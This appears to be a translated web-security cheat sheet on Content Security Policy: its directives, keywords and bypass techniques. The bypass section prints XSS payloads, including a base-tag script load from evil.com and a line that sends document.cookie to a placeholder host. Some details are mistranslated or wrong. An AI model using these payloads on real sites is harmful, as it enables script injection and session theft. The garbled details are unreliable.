CSP
========================================

What is CSP?
----------------------------------------
Content Security Policy, referred to as CSP, is translated as content security policy. As the name suggests, this specification is related to content security, mainly used to define which resources can be loaded by the current page to reduce the occurrence of XSS.

Configuration
----------------------------------------
CSP policies can be defined through HTTP header information or meta elements.

There are three categories of CSP:

- Content-Security-Policy  (Google Chrome)
- X-Content-Security-Policy (Firefox)
- X-WebKit-CSP (WebKit-based browsers, e.g. Safari)

::

HTTP header :
"Content-Security-Policy:" policy
"Content-Security-Policy-Report-Only:" Policy


The HTTP Content-Security-Policy header can specify that one or more resources are secure, while Content-Security-Policy-Report-Only allows the server to check (not enforce) a policy. The policy definition of multiple headers is first defined by priority.

HTML Meta :
::

<meta http-equiv="content-security-policy" content="策略">
<meta http-equiv="content-security-policy-report-only" content="策略">


Instructions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

============    ============
Instructions Description
============    ============
default-src defines the resource default loading policy
connect-src defines loading strategies such as Ajax, WebSocket, etc.
font-src defines Font loading policy
frame-src defines Frame loading policy
img-src defines image loading strategy
media-src defines the reference resource loading strategies such as <audio>, <video>, etc.
object-src defines the reference resource loading strategies such as <applet>, <embed>, <object>, etc.
script-src defines JS loading policy
style-src defines CSS loading policy
base-uri defines the <base> root URL policy, without using default-src as the default value
sandbox value is allow-forms, enable sandbox for resources
The value of report-uri is /report-uri, submit log
============    ============

Keywords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``-``
- Allow loading from any url except ``data:``````` ``` ``` filesystem:``````````` schemes``
- e.g. ``img-src -``
- ``none``
- Disable loading of resources from any url
- e.g. ``object-src 'none'``
- ``self``
- Only homologous resources can be loaded
- e.g. ``img-src 'self'``
- ``data:``
- Resources can be loaded through the data protocol
- e.g. ``img-src 'self' data:``
- ``domain.example.com``
- e.g. ``img-src domain.example.com``
- Resources can only be loaded from specific domains
- ``\*.example.com``
- e.g. ``img-src \*.example.com``
- Resources can be loaded from any subdomain of example.com
- ``https://cdn.com``
- e.g. ``img-src https://cdn.com``
- Resources can only be loaded with https from a given domain
- ``https:``
- e.g. ``img-src https:``
- Only use https to load resources from any domain
- ``unsafe-inline``
- Allow internal resources to execute code such as style attribute, onclick or sict tags
- e.g. ``script-src 'unsafe-inline'``
- ``unsafe-eval``
- Allow some unsafe code execution methods, such as eval() of js
- e.g. ``script-src 'unsafe-eval'``
- ``nonce-<base64-value>'``
- Use random nonce to allow loading tags with matching tags with nonce attributes on tags
- e.g. ``script-src 'nonce-bm9uY2U='``
-`` <hash-algo>-<base64-Value> '`
- Allows the code block that matches hash values to be executed
- e.g. ``script-src 'sha256-<base64-value>'``

Configuration Example
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Allows execution of inline JS code, but does not allow external resources to be loaded
::

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';


Bypass
---------------------------------------

Preload
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In order to enhance the user experience and make the browser more efficient, the browser has a preload function, which basically uses the browser's idle time to load the specified content and then cache it. This technology is further subdivided into DNS-prefetch, subresource, prefetch, preconnect, and prerender.

HTML5 page preloading is specified using the rel attribute of the link tag. If the csp header has unsafe-inline, then a request can be made to the outside world by preloading, for example

::

<!-- Preload a page -->
<link rel='prefetch' href='http://xxxx'><!-- firefox -->
<link rel='prerender' href='http://xxxx'><!-- chrome -->
<!-- Preload a picture -->
<link rel='prefetch' href='http://xxxx/x.jpg'>
<!-- DNS pre-resolution -->
<link rel="dns-prefetch" href="http://xxxx">
<!-- Preload for specific file types -->
<link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->

In addition, not all pages can be preloaded, and when the resource type is as follows, the preload operation will be blocked:

- The URL contains download resources
- The page contains audio and video
- Ajax requests for POST, PUT and DELET operations
- HTTP authentication
- HTTPS page
- Pages containing malware
- Pop-up page
- Pages that take up a lot of resources
- The Chrome developer tools development tool has been opened

MIME Sniff
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
For example, csp prohibits cross-site reading of scripts, but can read imgs across sites. Then pass an img with scripts and then ``<script href='http://xxx.com/xx.jpg'>`` , here csp thinks it is an img, bypassing the check. If the website does not return the correct mime type, the browser will make a guess, and the img may be loaded as a script.

302 jump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
For 302 jump bypass CSP, there are actually the following restrictions:

- The springboard must be within the allowed domain.
- The host part of the file to be loaded must be consistent with the host part of the allowed domain

iframe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
When you can execute code, you can create a frame with a static file such as ``css```js`. When the configuration is not configured, the frame does not exist in csp. Then create the frame again under the frame to reach bypass purpose. Similarly, using links such as ``../../../````/%2e%2e%2f`` that may trigger the server error can also achieve the corresponding purpose.

Bases
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
When script-src is nonce or unlimited, and base-uri is unlimited, you can modify the root URL through the ``base`` tag to bypass, as follows: http://evil.com/main.js

::

<base href="http://evil.com/">
<script nonce="correct value" src="/main.js"></script>

other
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- location Bypass
- When uploading SVG, bypassing homologous sites through malicious SVG
- When there is a CRLF vulnerability and the controllable point is above the CSP, it can inject HTTP response to affect CSP resolution
- CND Bypass, if the website trusts a CDN, then the static resource of the corresponding CDN can be used bypass
- Angular versions <1.5.9 >=1.5.0, vulnerability `Git Pull Request <https://github.com/angular/angular.js/pull/15346>`_
- jQuery sourcemap
::

document.write(`<script>
//@        sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);``
- ping properties of a tag
- For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
- ``<link rel="import" />``
- ``<meta http-equiv="refresh" content="0; url=http://...." />``
- Only restrict ``script-src`` when:
- ``<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>``
